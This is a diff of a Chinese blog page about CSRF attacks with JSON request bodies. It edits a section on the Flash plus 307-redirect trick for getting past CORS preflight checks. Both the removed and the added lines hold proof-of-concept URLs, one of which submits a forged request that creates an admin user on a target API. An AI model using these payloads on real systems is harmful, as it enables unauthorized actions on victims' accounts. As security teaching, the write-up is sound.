@@ -88,7 +88,8 @@
 <meta property="og:description" content="Json格式的CSRF有这样一个场景，新增用户不校验Referer，没有token，马上可以想到CSRF漏洞。但它又有一些不同的是它提交的数据是Json格式的，请求包类似： POST &#x2F;api&#x2F;add HTTP&#x2F;1.1 Host: target.com User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko&#x2F;">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https:&#x2F;&#x2F;ftp.bmp.ovh&#x2F;imgs&#x2F;2019&#x2F;11&#x2F;6f3ba4b5502fe8ae.png">
-<meta property="og:updated_time" content="2020-01-10T09:51:44.889Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.bmp.ovh&#x2F;imgs&#x2F;2020&#x2F;03&#x2F;23f70022bab710a4.png">
+<meta property="og:updated_time" content="2020-03-01T14:03:55.103Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;ftp.bmp.ovh&#x2F;imgs&#x2F;2019&#x2F;11&#x2F;6f3ba4b5502fe8ae.png">
 
@@ -397,17 +398,18 @@ Access-Control-Request-Method: POST
 Access-Control-Request-Headers: content-type
 Origin: null
 Connection: close</code></pre><p>如果服务器并未设置允许任意域名跨域请求，就会拒绝options预请求。</p>
-<h2 id="Flash-307跳转"><a href="#Flash-307跳转" class="headerlink" title="Flash+307跳转"></a>Flash+307跳转</h2><p>这里可以使用Flash+307跳转绕过（但是该方法在新版的一些浏览器应该都不行了）</p>
+<h2 id="Flash-307跳转"><a href="#Flash-307跳转" class="headerlink" title="Flash+307跳转"></a>Flash+307跳转</h2><p>这里可以使用Flash+307跳转绕过（但是该方法在2018年之后版本的浏览器应该都不行了）</p>
 <p>需要环境如下：</p>
 <ul>
 <li>能发起HTTP请求的swf文件(csrf_json.swf)</li>
 <li>307跳转(307.php)</li>
 <li>上面两个文件同域</li>
 </ul>
-<p>轮子：<a href="https://github.com/sp1d3r/swf_json_csrf" target="_blank" rel="noopener">https://github.com/sp1d3r/swf_json_csrf</a></p>
-<p>poc:</p>
-<p><code>http://test.com/csrf_json.swf?jsonData={&quot;login&quot;:&quot;admin1&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;mobile&quot;:&quot;13000000000&quot;,&quot;intercode&quot;:&quot;86&quot;,&quot;name&quot;:&quot;&quot;,&quot;requestCode&quot;:&quot;&quot;,&quot;responseCode&quot;:&quot;&quot;&quot;}&amp;php_url=http://test.com/307.php&amp;endpoint=http://target.com/api/add</code></p>
-<p>在线工具：<a href="http://www.0xby.com/swf_json_csrf/ui.html" target="_blank" rel="noopener">http://www.0xby.com/swf_json_csrf/ui.html</a></p>
+<p>参考：<a href="https://github.com/sp1d3r/swf_json_csrf" target="_blank" rel="noopener">https://github.com/sp1d3r/swf_json_csrf</a></p>
+<p>使用1lastBr3ath提供的测试POC进行测试：</p>
+<p><a href="http://cm2.pw/crossdomain" target="_blank" rel="noopener">http://cm2.pw/crossdomain</a></p>
+<p>POC:</p>
+<pre><code>http://cm2.pw/redirect?url=http://xxxxtarget.com/add&amp;status=307</code></pre><p><img src="https://i.bmp.ovh/imgs/2020/03/23f70022bab710a4.png" alt=""></p>
 
       
     </div>
